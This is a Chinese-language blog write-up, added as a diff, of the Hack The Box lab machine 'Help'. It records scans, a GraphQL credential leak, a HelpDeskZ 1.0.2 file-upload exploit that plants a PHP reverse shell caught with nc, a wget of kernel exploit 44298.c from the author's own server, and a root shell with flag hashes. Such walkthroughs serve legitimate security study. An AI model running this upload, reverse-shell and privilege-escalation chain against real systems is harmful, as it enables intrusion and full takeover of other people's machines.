@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Help - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Help靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.121 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-01 09:14 CST Nmap scan r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Help - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Help靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.121 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-01 09:14 CST Nmap scan r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/cf4c49c4-a97c-44da-b0fc-1a3d55516bbb.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/bf387b14-d774-411a-802a-c102eed009f2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/f9f452a5-ebd8-49dd-abeb-ed67d289194e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/75a9bf99-347f-4667-9efd-dbaea725dd1f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/53d8d61c-ec33-4116-ab6f-ee458b65615b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/be2f7cf8-3462-4877-a5b9-c6b006fe0920.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/6995cd39-bb36-4b5b-a7c2-52c5f29af255.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/7bf17396-814b-4c47-84d2-cc3ea7ab1fdc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/2324c19f-f59c-485b-9127-eee4817e4073.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/eee7ea28-ca2f-4d5a-ae47-b7dfae60f84a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/582b25b2-d598-4188-abcd-77f4ffc8ac27.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/6959207b-6185-4551-a699-deb49f023f59.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/ec95c9d8-0112-4cf7-844f-7037ad2f886e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/8f647a18-4501-4874-b67c-ad9af62da5e5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/dfb3d676-97cc-4c82-96fa-fe07fc4cef6a.png">
+<meta property="article:published_time" content="2022-09-05T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:44:51.124Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/cf4c49c4-a97c-44da-b0fc-1a3d55516bbb.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Help - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Help - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-09-05T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-09-05
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Help"><span class="post-toc-text">Hackthebox - Help</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3000-端口"><span class="post-toc-text">3000 端口</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-Help"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Help - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-09-05 19:38:36" datetime="2022-09-05T11:38:36.000Z"  itemprop="datePublished">2022-09-05</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Help"><a href="#Hackthebox-Help" class="headerlink" title="Hackthebox - Help"></a>Hackthebox - Help</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/cf4c49c4-a97c-44da-b0fc-1a3d55516bbb.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/bf387b14-d774-411a-802a-c102eed009f2.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.121
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 09:14 CST
+Nmap scan report for 10.10.10.121
+Host is up (0.35s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://help.htb/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8).
+Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), DD-WRT (Linux 3.18) (93%), Linux 4.10 (93%), Linux 4.2 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   349.63 ms 10.10.14.1
+2   349.25 ms 10.10.10.121
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.59 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/f9f452a5-ebd8-49dd-abeb-ed67d289194e.png" class>
+
+<p>直接访问会被跳转到 htlp.htb 去加一个 hosts</p>
+<pre><code class="bash">echo 10.10.10.121 help.htb &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/75a9bf99-347f-4667-9efd-dbaea725dd1f.png" class>
+
+<p>现在可以访问了，不过是 apache2 的默认界面，去 fuzz 一下</p>
+<h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# gobuster dir -u http://help.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 --no-error
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://help.htb/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/04 20:36:06 Starting gobuster in directory enumeration mode
+===============================================================
+/javascript           (Status: 301) [Size: 309] [--&gt; http://help.htb/javascript/]
+/support              (Status: 301) [Size: 306] [--&gt; http://help.htb/support/]   
+/server-status        (Status: 403) [Size: 296]                                  
+
+===============================================================
+2022/09/04 20:37:41 Finished
+===============================================================
+</code></pre>
+<p>有一个 support 目录，访问一下</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/53d8d61c-ec33-4116-ab6f-ee458b65615b.png" class>
+
+<p>是一个登录页面，并且可以确定框架为 helpdeskz</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# searchsploit helpdeskz 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                                                                   | php/webapps/40300.py
+HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                                                                            | php/webapps/41200.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>可以看到有两个漏洞，分别是 1.0.2 版本的任意文件上传以及 1.0.2 版本以下的 sql 注入，但是我们无法确定当前 cms 的版本号</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# curl http://help.htb/support/README.md
+{% image Hackthebox-Help//images/logo.png '' '' %}
+
+Version: 1.0.2 from 1st June 2015&lt;br&gt;
+Developed by: Evolution Script S.A.C.&lt;br&gt;
+[Help Desk Software HelpDeskZ](http://www.helpdeskz.com)
+
+HelpDeskZ is a free PHP based software which allows you to manage your site&#39;s support with a web-based support ticket system.
+
+## Requirements
+
+HelpDeskZ requires:
+
+- PHP 5.x
+- MySQL database
+- GD Library (only for captcha verification)
+- Mod_rewrite (only if you want to use permalinks)-
+
+## Upgrading
+
+To upgrade your HelpDeskZ from previous versions, please read the file UPGRADING.txt
+
+## Installation steps
+
+- Connect with FTP to the &lt;em&gt;public folder&lt;/em&gt; of your server where the rest of your Web site is
+- Create a new folder where you will install HelpDeskZ. Name it anything you like, for example &quot;helpdesk&quot; or &quot;support&quot;.&lt;br&gt;
+Example: /public_html/support&lt;br&gt;
+Corresponding URL: http://www.site.com/support
+- Upload all HelpDeskZ files to your server.
+- Open **/install** in your browser, for example (modify to your URL):&lt;br /&gt;
+http://www.site.com/support/install
+- The HelpDeskZ setup script will run. Click &lt;strong&gt;INSTALL HELPDESKZ&lt;/strong&gt; and follow the instructions through License agreement, Check Setup and Database settings.
+- Before closing the install script **DELETE the &quot;install&quot; directory from your server!**
+- Now it&#39;s time to setup your help desk! Open the &lt;strong&gt;staff&lt;/strong&gt; panel in your browser, for example:&lt;br /&gt;
+http://www.site.com/support/?v=staff&lt;br /&gt;
+Use the login details that you entered in the installation process.
+- Go to &lt;strong&gt;Settings -&gt; General&lt;/strong&gt; to get to the settings page.
+- Take some time and get familiar with all of the available settings. Most of them should be self-explanatory.
+- If you want to use permalinks like http://www.site.com/support/staff/ then you have to enable this option on Settings -&gt; General -&gt; Helpdesk -&gt; Use SEO-friendly URLs
+- Good luck using HelpDeskZ!
+- 
+## Email Piping
+HelpDeskZ supports email piping, this allows the auto-creation of tickets from incoming emails to a set email address.
+- To enable email piping for your help desk follow this &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/10/setting-up-email-piping&quot;&gt;email piping tutorial.&lt;/a&gt;
+
+## Customize the look
+For detailed information please see this &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/6/how-do-i-customize-helpdeskz-look&quot;&gt;knowledgebase article.&lt;/a&gt;
+
+## Translate HelpDeskZ to your language
+To translate HelpDeskZ read &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/8/how-can-i-translate-helpdeskz&quot;&gt;How can I translate HelpDeskZ.&lt;/a&gt;
+</code></pre>
+<p>通过 README.md 得知当前版本为 1.0.2</p>
+<p>根据漏洞，当前应该是可以直接进行 sql 注入尝试的，不过咱们再看看更多思路</p>
+<h2 id="3000-端口"><a href="#3000-端口" class="headerlink" title="3000 端口"></a>3000 端口</h2><img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/be2f7cf8-3462-4877-a5b9-c6b006fe0920.png" class>
+
+<p>这边有个 3000 端口可以访问</p>
+<pre><code class="bash">&quot;Hi Shiv, To get access please find the credentials with given query&quot;
+</code></pre>
+<p>这提示我们，想要获得权限，需要通过给定的查询找到答案</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# dirsearch -u &quot;http://10.10.10.121:3000&quot;       
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /root/.dirsearch/reports/10.10.10.121-3000/_22-07-01_09-29-39.txt
+
+Error Log: /root/.dirsearch/logs/errors-22-07-01_09-29-39.log
+
+Target: http://10.10.10.121:3000/
+
+[09:29:40] Starting: 
+[09:33:40] 400 -   18B  - /graphql/                                         
+[09:33:40] 400 -   18B  - /graphql/console/
+[09:33:40] 400 -   18B  - /graphql                                          
+
+Task Completed
+</code></pre>
+<p>找到了一个 &#x2F;graphql 目录，这个目录下还有一个 &#x2F;console 目录，去访问一下</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/6995cd39-bb36-4b5b-a7c2-52c5f29af255.png" class>
+
+<p>这边提示需要一个 get 参数 query</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/7bf17396-814b-4c47-84d2-cc3ea7ab1fdc.png" class>
+
+<p>随便加一个参数后倒是出来数据了，但是提示语法错误，去找一下query相关的功能</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/2324c19f-f59c-485b-9127-eee4817e4073.png" class>
+
+<p>找到相关的利用方式，然后读取到了一个账号密码</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/eee7ea28-ca2f-4d5a-ae47-b7dfae60f84a.png" class>
+
+<p>得到解密后的账号密码</p>
+<pre><code class="bash">username = helpme@helpme.com
+password = godhelpmeplz
+</code></pre>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/582b25b2-d598-4188-abcd-77f4ffc8ac27.png" class>
+
+<p>在 80 端口成功登录</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/6959207b-6185-4551-a699-deb49f023f59.png" class>
+
+<p>把时区修改为我们当前环境的时区</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/ec95c9d8-0112-4cf7-844f-7037ad2f886e.png" class>
+
+<p>在 Submit a Ticket 中尝试上传一个 php 文件</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/8f647a18-4501-4874-b67c-ad9af62da5e5.png" class>
+
+<p>这里提示上传失败，但是其实是成功的，不过会被修改为随机文件名，找到就可以了，所以我们还是去利用脚本吧</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# python2 40300.py http://help.htb/support/uploads/tickets/ 1.php
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
+found!
+http://help.htb/support/uploads/tickets/9d831815c3faa6a961d01bd9dc543aca.php
+</code></pre>
+<p>上传成功，去尝试访问看看</p>
+<img src="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/dfb3d676-97cc-4c82-96fa-fe07fc4cef6a.png" class>
+
+<p>成功上传并且访问成功，去制作一个 php 的 revershell</p>
+<blockquote>
+<p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
+</blockquote>
+<p>然后去网页端上传，接着使用 nc 监听一个端口，然后运行 exploit</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# python2 40300.py http://help.htb/support/uploads/tickets/ phpshell.php
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
+</code></pre>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.10.121] 35558
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 19:41:30 up 1 day,  9:53,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
+help@help:/$ id&amp;&amp;whoami
+id&amp;&amp;whoami
+uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
+help
+</code></pre>
+<p>成功弹回 shel</p>
+<pre><code class="bash">cat user.txt
+64cf57c35b4e6991534e125790ad0b55
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>首先使用 python 开启一个 http 服务器，然后上传一个 linpeas 提权辅助脚本</p>
+<pre><code class="bash">                                                                                 ╔═══════════════════╗
+═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                                                                                                     
+                                         ╚═══════════════════╝                                                                                                                                                                              
+OS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
+User &amp; Groups: uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
+Hostname: help
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                               
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+</code></pre>
+<p>这边看到了系统版本是 ubuntu 4.40，去搜索下是否有漏洞</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# searchsploit 4.4.0-116
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                                                    | linux/local/44298.c
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>找到一个 传到服务器去，然后编译运行</p>
+<pre><code class="bash">help@help:/tmp$ wget http://10.10.14.9/44298.c
+wget http://10.10.14.9/44298.c
+--2022-09-04 20:40:43--  http://10.10.14.9/44298.c
+Connecting to 10.10.14.9:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5773 (5.6K) [text/x-csrc]
+Saving to: &#39;44298.c&#39;
+
+44298.c             100%[===================&gt;]   5.64K  --.-KB/s    in 0s      
+
+2022-09-04 20:40:43 (20.3 MB/s) - &#39;44298.c&#39; saved [5773/5773]
+</code></pre>
+<p>传输进来以后，去进行编译</p>
+<pre><code class="bash">help@help:/tmp$ gcc 44298.c -o exploit 
+gcc 44298.c -o exploit
+</code></pre>
+<p>接着运行</p>
+<pre><code class="bash">help@help:/tmp$ ./exploit
+./exploit
+task_struct = ffff880037ee8000
+uidptr = ffff880036f91084
+spawning root shell
+root@help:/tmp# whoami&amp;&amp;id
+whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
+</code></pre>
+<pre><code class="bash">root@help:/root# cat root.txt
+cat root.txt
+9123b571740b6f2c3b1a7fa657c55f20
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/&title=《Help - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/&title=《Help - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Help - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Shoppy - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/08/06/OSCP/OSCP%E9%9A%8F%E7%AC%94/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">OSCP随笔</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
